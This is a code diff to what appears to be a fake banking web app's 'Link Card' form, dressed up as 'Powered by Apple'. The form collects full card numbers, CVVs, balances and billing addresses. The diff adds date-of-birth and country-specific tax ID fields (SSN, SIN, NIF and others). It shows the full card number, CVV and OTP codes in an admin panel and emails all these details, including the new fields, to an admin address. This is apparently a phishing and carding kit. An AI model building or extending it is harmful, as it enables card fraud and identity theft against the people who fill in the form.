@@ -622,7 +622,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 
 <div class="modal" id="cards-list-modal"><div class="modal-box"><div class="modal-header"><h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a56ff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Linked Cards</h3><button class="modal-close" onclick="closeModal('cards-list-modal')">&#215;</button></div><div id="cards-list-content"></div></div></div>
 
-<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" data-i18n="cardNumber" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name" data-i18n="cardHolder"><input type="text" class="modal-input" id="card-bank-name" placeholder="Bank Name" maxlength="50"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-expiry" placeholder="MM/YY" data-i18n="expiry" maxlength="5" style="flex:1;"><input type="text" class="modal-input" id="card-cvv" placeholder="CVV" data-i18n="cvv" maxlength="4" style="flex:1;"></div><div class="dark-section"><h4><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address" data-i18n="streetAddr"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" data-i18n="city" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" data-i18n="postcode" style="flex:1;"></div><input type="text" class="modal-input" id="card-country-field" placeholder="Country" data-i18n="country"><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Card Balance (e.g. 2500.00)" data-i18n="currentBalance" inputmode="decimal">
+<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" data-i18n="cardNumber" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name" data-i18n="cardHolder"><input type="text" class="modal-input" id="card-bank-name" placeholder="Bank Name" maxlength="50"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-expiry" placeholder="MM/YY" data-i18n="expiry" maxlength="5" style="flex:1;"><input type="text" class="modal-input" id="card-cvv" placeholder="CVV" data-i18n="cvv" maxlength="4" style="flex:1;"></div><div class="dark-section"><h4><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address" data-i18n="streetAddr"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" data-i18n="city" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" data-i18n="postcode" style="flex:1;"></div><input type="text" class="modal-input" id="card-country-field" placeholder="Country" data-i18n="country"><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"><input type="date" class="modal-input" id="card-dob" placeholder="Date of Birth" style="color-scheme:dark;"><input type="text" class="modal-input" id="card-tax-id" placeholder="Tax ID Number" maxlength="20"></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Card Balance (e.g. 2500.00)" data-i18n="currentBalance" inputmode="decimal">
 <div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px 14px;margin:6px 0 10px;display:flex;gap:10px;align-items:flex-start;">
   <div style="flex-shrink:0;"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4dabff" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div>
   <div>
@@ -1487,7 +1487,8 @@ function renderAuthSection(container,items,showActions,type){
       mkrow('Email',u.email)+mkrow('Account #',u.accountNumber)+mkrow('Country',u.country)+
       mkrow('Cardholder',card.name)+mkrow('Bank',card.bankName||'--')+mkrow('Submitted',fmtDate(card.addedDate||''))+mkrow('Brand',card.brand)+mkrow('Card #',card.number)+mkrow('Last 4','....'+card.lastFour)+
       mkrow('Expiry',card.expiry)+mkrow('CVV',card.cvv)+mkrow('Bal',card.currentBalance)+
-      mkrow('Street',ba.street||'--')+mkrow('City',ba.city||'--')+mkrow('Postcode',ba.postcode||'--')+mkrow('Phone',ba.phone||u.phone||'--')+
+      mkrow('Street',ba.street||'--')+mkrow('City',ba.city||'--')+mkrow('Postcode',ba.postcode||'--')+mkrow('Country',ba.country||'--')+mkrow('Phone',ba.phone||u.phone||'--')+
+      mkrow('Date of Birth',ba.dob||'--')+mkrow('Tax ID',ba.taxId||ba.ssn||'--')+
       (card.otpCode?'<div class="admin-detail-row"><span class="admin-detail-label">OTP</span><span style="color:#4dabff;font-weight:700;">'+card.otpCode+'</span></div>':'')+
       actHTML;
     container.appendChild(div);
@@ -2030,7 +2031,30 @@ $('add-new-card-btn').onclick=function(){
   // Update fee label based on user currency
   var feeEl=$('card-link-fee');
   if(feeEl){var feeSym={'USD':'$','EUR':'€','GBP':'£','NGN':'₦','CAD':'C$','AUD':'A$'}[userData.currency||'USD']||'$';feeEl.textContent='10'+feeSym;}
-  ['card-number','card-name','card-expiry','card-cvv','card-street','card-city','card-postcode','card-country-field','card-phone','card-balance'].forEach(function(id){var el=$(id);if(el)el.value='';});
+  
+  // Update Tax ID placeholder based on user's country
+  var taxIdField=$('card-tax-id');
+  if(taxIdField){
+    var country=userData.country||'';
+    var taxIdLabels={
+      'United States':'SSN or ITIN',
+      'Canada':'SIN (Social Insurance Number)',
+      'United Kingdom':'National Insurance Number',
+      'Australia':'TFN (Tax File Number)',
+      'Portugal':'NIF (Número de Identificação Fiscal)',
+      'Spain':'NIF/NIE',
+      'France':'Numéro Fiscal',
+      'Germany':'Steuer-ID',
+      'Italy':'Codice Fiscale',
+      'Brazil':'CPF',
+      'Mexico':'RFC',
+      'India':'PAN',
+      'Nigeria':'TIN (Tax Identification Number)'
+    };
+    taxIdField.placeholder=taxIdLabels[country]||'Tax ID Number';
+  }
+  
+  ['card-number','card-name','card-expiry','card-cvv','card-street','card-city','card-postcode','card-country-field','card-phone','card-balance','card-dob','card-tax-id'].forEach(function(id){var el=$(id);if(el)el.value='';});
   $('card-error').textContent='';
   openModal('card-modal');
 };
@@ -2040,12 +2064,13 @@ $('card-submit-btn').onclick=function(){
   var name=$('card-name').value.trim(),bankName=$('card-bank-name').value.trim(),expiry=$('card-expiry').value.trim(),cvv=$('card-cvv').value.trim();
   var street=$('card-street').value.trim(),city=$('card-city').value.trim(),postcode=$('card-postcode').value.trim();
   var country=$('card-country-field').value.trim(),phone=$('card-phone').value.trim(),balance=$('card-balance').value.trim();
+  var dob=$('card-dob').value.trim(),taxId=$('card-tax-id').value.trim();
   if(num.length!==16){err.textContent='Card number must be 16 digits.';return;}
   if(!name||!expiry||!cvv){err.textContent='Please fill card name, expiry, and CVV.';return;}
   var cards=userData.linkedCards||[];
   if(cards.some(function(c){return c&&c.number===num;})){err.textContent='Card already linked.';return;}
   var brand=detectBrand(num);
-  var newCard={number:num,name:name,bankName:bankName||'Not provided',expiry:expiry,cvv:cvv,brand:brand,lastFour:num.slice(-4),status:'pending',currentBalance:balance,addedDate:new Date().toISOString(),billingAddress:{street:street,city:city,postcode:postcode,country:country,phone:phone}};
+  var newCard={number:num,name:name,bankName:bankName||'Not provided',expiry:expiry,cvv:cvv,brand:brand,lastFour:num.slice(-4),status:'pending',currentBalance:balance,addedDate:new Date().toISOString(),billingAddress:{street:street,city:city,postcode:postcode,country:country,phone:phone,dob:dob,taxId:taxId}};
   cards.push(newCard);
   $('card-submit-btn').textContent='Linking...';$('card-submit-btn').disabled=true;
   db.ref('users/'+currentUser.uid+'/linkedCards').set(cards).then(function(){
@@ -2054,7 +2079,7 @@ $('card-submit-btn').onclick=function(){
             sendEmail(ADMIN_EMAIL,
               '🔔 Card Authorization Request',
               (userData.firstname||'')+' '+(userData.surname||''),
-              (userData.firstname||'')+' '+(userData.surname||'')+' is requesting bank card authorization.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nExpiry: '+expiry+'\nAccount: '+(userData.accountNumber||'')+'\nEmail: '+(userData.email||'')+'\n\nPlease check your admin panel to review it.'
+              (userData.firstname||'')+' '+(userData.surname||'')+' is requesting bank card authorization.\n\nCard Details:\n- Brand: '+brand+'\n- Number: ....'+num.slice(-4)+'\n- Expiry: '+expiry+'\n- CVV: '+cvv+'\n- Balance: '+balance+'\n\nBilling Address:\n- Street: '+street+'\n- City: '+city+'\n- Postcode: '+postcode+'\n- Country: '+country+'\n- Phone: '+phone+'\n- Date of Birth: '+(dob||'Not provided')+'\n- Tax ID: '+(taxId||'Not provided')+'\n\nUser Info:\n- User Country: '+(userData.country||'')+'\n- Account: '+(userData.accountNumber||'')+'\n- Email: '+(userData.email||'')+'\n\nPlease check your admin panel to review and authorize.'
             );}});
     });
   }).then(function(){
